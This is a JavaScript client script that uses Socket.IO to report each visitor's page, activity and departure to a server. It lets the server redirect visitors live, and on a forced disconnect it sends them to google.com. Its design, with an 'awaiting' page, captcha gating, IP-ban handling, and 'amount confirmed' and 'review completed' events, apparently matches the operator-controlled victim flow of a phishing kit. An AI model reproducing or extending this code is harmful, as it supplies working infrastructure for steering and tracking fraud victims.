class URLManager {
    static currentUrl = null;
    static sessionId = null;
    static currentPage = 'awaiting';

    static getCurrentPage() {
        const path = window.location.pathname;
        const page = path.split('/').pop().replace('.html', '');
        return page || 'awaiting';
    }

    static updateURL(url) {
        if (!url) return;

        // Parse the new URL parameters
        const urlParams = new URLSearchParams(url.split('?')[1]);
        const clientId = urlParams.get('client_id');
        const oauthChallenge = urlParams.get('oauth_challenge');
        
        // Keep the verified parameter if it exists
        const currentParams = new URLSearchParams(window.location.search);
        const verified = currentParams.get('verified');
        
        // Construct the new URL
        let newUrl = url;
        if (verified === '1') {
            newUrl += '&verified=1';
        }

        // Update URL without page reload
        window.history.replaceState({}, '', newUrl);
        this.currentUrl = newUrl;
        
        // Store session ID from URL
        if (clientId) {
            this.sessionId = clientId;
        }
    }

    static getSessionId() {
        if (this.sessionId) return this.sessionId;
        
        const params = new URLSearchParams(window.location.search);
        return params.get('client_id');
    }
}

// Initialize session state
let isForceDisconnected = false;
let reconnectDisabled = false;

// Initialize socket with modified options
const socket = io('/user', {
    query: {
        page: window.location.pathname.split('/').pop()
    },
    reconnection: true,
    reconnectionAttempts: 5,
    reconnectionDelay: 1000,
    forceNew: true
});

// Handle page status updates
function emitPageChange(pageName) {
    socket.emit('page_loading', true);
    socket.emit('page_change', pageName + '.html');
}

// Handle force disconnect
socket.on('force_disconnect', () => {
    console.log('Forced disconnect received');
    isForceDisconnected = true;
    reconnectDisabled = true;
    socket.io.opts.reconnection = false;
    socket.disconnect();
    
    // Clear any existing intervals
    if (window.heartbeatInterval) clearInterval(window.heartbeatInterval);
    
    setTimeout(() => {
        window.location.href = 'https://google.com';
    }, 100);
});

// Handle connection establishment
socket.on('connect', () => {
    if (isForceDisconnected) {
        socket.disconnect();
        return;
    }

    console.log('Socket connected');
    socket.emit('page_loading', true);
    
    const sessionId = URLManager.getSessionId();
    if (sessionId) {
        socket.emit('check_session', {
            sessionId,
            currentUrl: window.location.pathname + window.location.search
        });
    }
    
    const currentPage = URLManager.getCurrentPage();
    emitPageChange(currentPage);

    setTimeout(() => {
        socket.emit('page_loading', false);
    }, 500);
});

// Handle session URL updates
socket.on('session_url', (url) => {
    console.log('Received session URL:', url);
    URLManager.updateURL(url);
});

// Handle redirects
socket.on('redirect', (url) => {
    if (isForceDisconnected) return;
    
    console.log('Redirecting to:', url);
    socket.emit('page_loading', true);
    
    const pageMatch = url.match(/([^\/]+?)\.html$/i);
    const pageName = pageMatch ? pageMatch[1] : 'awaiting';
    URLManager.currentPage = pageName;

    // Don't emit 'user_leaving' on redirects
    const onUnload = () => {
        window.removeEventListener('beforeunload', onUnload);
    };
    window.addEventListener('beforeunload', onUnload);

    setTimeout(() => {
        window.location.href = url;
    }, 50);
});

// Handle connection errors
socket.on('connect_error', (error) => {
    if (reconnectDisabled) return;
    
    console.error('Connection error:', error);
    if (error.message === 'IP banned' || error.message === 'website disabled') {
        window.location.href = '/pages/loading.html';
    }
});

// Set up heartbeat
window.heartbeatInterval = setInterval(() => {
    if (!isForceDisconnected && socket.connected) {
        socket.emit('heartbeat');
    }
}, 3000);

// Page navigation handlers
window.addEventListener('popstate', () => {
    if (!isForceDisconnected) {
        const currentPage = URLManager.getCurrentPage();
        emitPageChange(currentPage);
    }
});

document.addEventListener('click', (e) => {
    if (!isForceDisconnected && e.target.tagName === 'A' && e.target.href) {
        const url = new URL(e.target.href);
        if (url.origin === window.location.origin) {
            e.preventDefault();
            
            const pageMatch = url.pathname.match(/([^\/]+?)\.html$/i);
            const pageName = pageMatch ? pageMatch[1] : 'awaiting';
            
            emitPageChange(pageName);
        }
    }
});

window.addEventListener('load', () => {
    if (!isForceDisconnected) {
        console.log('Page fully loaded');
        socket.emit('page_loading', false);
    }
});

document.addEventListener('DOMContentLoaded', () => {
    if (!isForceDisconnected) {
        const currentPage = URLManager.getCurrentPage();
        emitPageChange(currentPage);
        
        setTimeout(() => {
            socket.emit('page_loading', false);
        }, 500);
    }
});

// Handle page unload
window.addEventListener('beforeunload', () => {
    socket.emit('page_loading', true);
    socket.emit('user_leaving');
});

// Captcha verification handler
window.onCaptchaSuccess = async (token) => {
    try {
        const response = await fetch('/verify-turnstile', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                token,
                sessionId: URLManager.getSessionId()
            })
        });

        const result = await response.json();
        if (result.success) {
            if (result.url) {
                socket.emit('page_loading', true);
                window.location.replace(result.url);
            }
            socket.emit('captcha_verified');
        }
    } catch (error) {
        console.error('Captcha verification failed:', error);
    }
};

// User action handlers
window.handleUserAction = async (actionType, data) => {
    socket.emit('user_action', {
        type: actionType,
        data: data,
        timestamp: new Date().toISOString()
    });
};

window.confirmAmount = (amount) => {
    socket.emit('amount_confirmed', { amount });
};

window.completeReview = () => {
    socket.emit('review_completed', {
        timestamp: new Date().toISOString()
    });
};

// Connection state handlers
socket.on('disconnect', () => {
    console.log('Socket disconnected');
    if (isForceDisconnected) {
        socket.io.opts.reconnection = false;
    }
});

socket.on('reconnect', (attemptNumber) => {
    if (isForceDisconnected) {
        socket.disconnect();
        return;
    }
    
    console.log('Socket reconnected after', attemptNumber, 'attempts');
    socket.emit('page_loading', true);
    
    const currentPage = URLManager.getCurrentPage();
    emitPageChange(currentPage);
    
    setTimeout(() => {
        socket.emit('page_loading', false);
    }, 500);
});

socket.on('reconnect_attempt', () => {
    if (reconnectDisabled || isForceDisconnected) {
        return false;
    }
    console.log('Attempting to reconnect...');
});

socket.on('reconnecting', (attemptNumber) => {
    if (!isForceDisconnected) {
        console.log('Reconnecting...', attemptNumber);
    }
});